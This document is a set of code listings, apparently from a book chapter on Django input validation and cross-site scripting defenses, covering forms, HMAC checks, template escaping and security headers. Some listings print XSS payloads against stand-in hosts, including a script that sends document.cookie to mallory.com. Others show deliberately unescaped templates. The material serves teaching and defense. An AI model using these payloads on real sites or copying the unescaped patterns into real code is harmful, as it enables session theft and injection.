["```py\n<script>\n    document.location = \"https:/./social.mallory.com\";    \u2776\n</script>\n```", "```py\nhttps:/./search.alice.com/?terms=\n\u27a5 %3Cscript%3E                                          \u2776\n\u27a5 document.location=%27https://search.mallory.com%27    \u2776\n\u27a5 %3C/script%3E                                         \u2776\n```", "```py\n<html>\n  <head>\n    <script>\n        const url = new URL(window.location.href);\n        const terms = url.searchParams.get('terms');    \u2776\n        document.write('You searched for ' + terms);    \u2777\n\n    </script>\n  </head>\n    ...\n</html>\n```", "```py\n<html>\n\n    <form method='POST'>\n        {% csrf_token %}            \u2776\n        <table>\n            {{ form.as_table }}     \u2777\n        </table>\n        <input type='submit' value='Submit'>\n    </form>\n\n</html>\n```", "```py\n...\nfrom django.core.validators import RegexValidator\n...\nclass AuthenticatedMessage(Model):\n    message = CharField(max_length=100)\n    hash_value = CharField(max_length=64,                                \u2776\n                           validators=[RegexValidator('[0-9a-f]{64}')])  \u2777\n```", "```py\n...\nimport hashlib\nimport hmac\n\nfrom django.utils.encoding import force_bytes\nfrom django.utils.translation import gettext_lazy as _\nfrom django.core.exceptions import ValidationError\n...\n...\nclass AuthenticatedMessage(Model):\n...\n    def clean(self):                                               \u2776\n hmac_function = hmac.new(                                  \u2777\n b'frown canteen mounted carve',                        \u2777\n msg=force_bytes(self.message),                         \u2777\n digestmod=hashlib.sha256)                              \u2777\n        hash_value = hmac_function.hexdigest()                     \u2777\n\n        if not hmac.compare_digest(hash_value, self.hash_value):   \u2778\n            raise ValidationError(_('Message not authenticated'),     \n                                  code='msg_not_auth')\n```", "```py\nfrom django.views.generic.edit import CreateView\nfrom messaging.models import AuthenticatedMessage\n\nclass CreateAuthenticatedMessageView(CreateView):   \u2776\n    model = AuthenticatedMessage                    \u2777\n    fields = ['message', 'hash_value']              \u2778\n    success_url = '/'                               \u2779\n```", "```py\n>>> import hashlib\n>>> import hmac\n>>> \n>>> hmac.new(\n...     b'frown canteen mounted carve',\n...     b'from Alice to Bob',                           \u2776\n...     digestmod=hashlib.sha256).hexdigest()\n'E52c83ad9c9cb1ca170ff60e02e302003cd1b3ae3459e35d3...'  \u2777\n```", "```py\nfrom django.core.mail import send_mail\nfrom django.shortcuts import render, redirect\nfrom django.views import View\n\nfrom messaging.forms import AuthenticatedMessageForm\n\nclass EmailAuthenticatedMessageView(View):\n    template = 'messaging/authenticatedmessage_form.html'\n\n    def get(self, request):                              \u2776\n        ctx = {'form': AuthenticatedMessageForm(), }     \u2776\n        return render(request, self.template, ctx)       \u2776\n\n    def post(self, request):\n        form = AuthenticatedMessageForm(request.POST)    \u2777\n\n        if form.is_valid():                              \u2778\n            message = form.cleaned_data['message']\n            subject = form.cleaned_data['hash_value']\n            send_mail(subject, message, 'bob@bob.com', ['alice@alice.com'])\n            return redirect('/')\n\n        ctx = {'form': form, }                           \u2779\n        return render(request, self.template, ctx)       \u2779\n```", "```py\nfrom django.core.validators import RegexValidator\nfrom django.forms import Form, CharField\n\nclass AuthenticatedMessageForm(Form):\n    message = CharField(min_length=1, max_length=100)                        \u2776\n    hash_value = CharField(validators=[RegexValidator(regex='[0-9a-f]{64}')])C\n```", "```py\n...\nimport re\nfrom django.core.exceptions import ValidationError\nfrom django.utils.translation import gettext_lazy as _\n...\n...\nclass AuthenticatedMessageForm(Form):\n    message = CharField(min_length=1, max_length=100)\n    hash_value = CharField()\n\n...\n\n    def clean_hash_value(self):                                         \u2776\n        hash_value = self.cleaned_data['hash_value']\n        if not re.match('[0-9a-f]{64}', hash_value):\n            reason = 'Must be 64 hexadecimal characters'\n            raise ValidationError(_(reason), code='invalid_hash_value') \u2777\n        return hash_value\n```", "```py\nclass AuthenticatedMessageForm(Form):\n    message = CharField(min_length=1, max_length=100)\n    hash_value = CharField(validators=[RegexValidator(regex='[0-9a-f]{64}')])\n\n...\n\n    def clean(self):                                                \u2776\n        super().clean()\n message = self.cleaned_data.get('message')                  \u2777\n hash_value = self.cleaned_data.get('hash_value')            \u2777\n        ...                                                         \u2777\n        if condition:\n            reason = 'Message not authenticated'\n            raise ValidationError(_(reason), code='msg_not_auth')   \u2778\n```", "```py\n<html>\n    <div>\n        {{ fetched_from_db }}     \u2776\n    <div>\n</html>\n```", "```py\n<html>\n    <div>\n        {{ request.GET.query_parameter }}    \u2776\n    <div>\n</html>\n```", "```py\n$ python manage.py shell\n>>> from django.template import Template, Context\n>>> \n>>> template = Template('<html>{{ var }}</html>')              \u2776\n>>> poison = '<script>/* malicious */</script>'                \u2777\n>>> ctx = Context({'var': poison})\n>>> \n>>> template.render(ctx)                                       \u2778\n'<html>&lt;script&gt;/* malicious */&lt;/script&gt;</html>'    \u2779\n```", "```py\n<html>\n    {% autoescape off %}        \u2776\n        <div>\n            {{ request.GET.query_parameter }}\n        </div>\n    {% endautoescape %}         \u2777\n</html>\n```", "```py\n<html>\n    <div>\n        {{ request.GET.query_parameter|safe }}\n    </div>\n</html>\n```", "```py\n$ python manage.py shell\n>>> from django.template import Template, Context\n>>> from django.utils.safestring import mark_safe\n>>> \n>>> template = Template('<html>{{ var }}</html>')        \u2776\n>>> \n>>> native_string = '<script>/* malicious */</script>'   \u2777\n>>> safe_string = mark_safe(native_string)\n>>> type(safe_string)\n<class 'django.utils.safestring.SafeString'>\n>>> \n>>> ctx = Context({'var': safe_string})\n>>> template.render(ctx)                                 \u2778\n'<html><script>/* malicious */</script></html>'          \u2779\n```", "```py\n<html>\n    {% autoescape off %}                               \u2776\n        <div>\n            {{ request.GET.query_parameter|escape }}   \u2777\n        </div>\n    {% endautoescape %}                                \u2778\n</html>\n```", "```py\n>>> from django.utils.html import escape\n>>> \n>>> poison = '<script>/* malicious */</script>'\n>>> escape(poison)\n'&lt;script&gt;/* malicious */&lt;/script&gt;'     \u2776\n```", "```py\n<html>\n    <div class={{ request.GET.query_parameter }}>\n        XSS without special characters\n    </div>\n</html>\n```", "```py\n<script>\n    const url = 'https:/./mallory.com/?loot=' + document.cookie;   \u2776\n    document.write('<img src=\"' + url + '\">');                    \u2777\n</script>\n```", "```py\nSet-Cookie: sessionid=<session-id-value>; HttpOnly\n```", "```py\nclass CookieSettingView(View):\n\n    def get(self, request):\n        ...\n\n        response = HttpResponse()\n        response.set_cookie(         \u2776\n            'cookie-name',\n            'cookie-value',\n                ...\n            httponly=True)           \u2777\n\n        return response\n```", "```py\nX-Content-Type-Options: nosniff\n```", "```py\nX-XSS-Protection: 1; mode=block\n```"]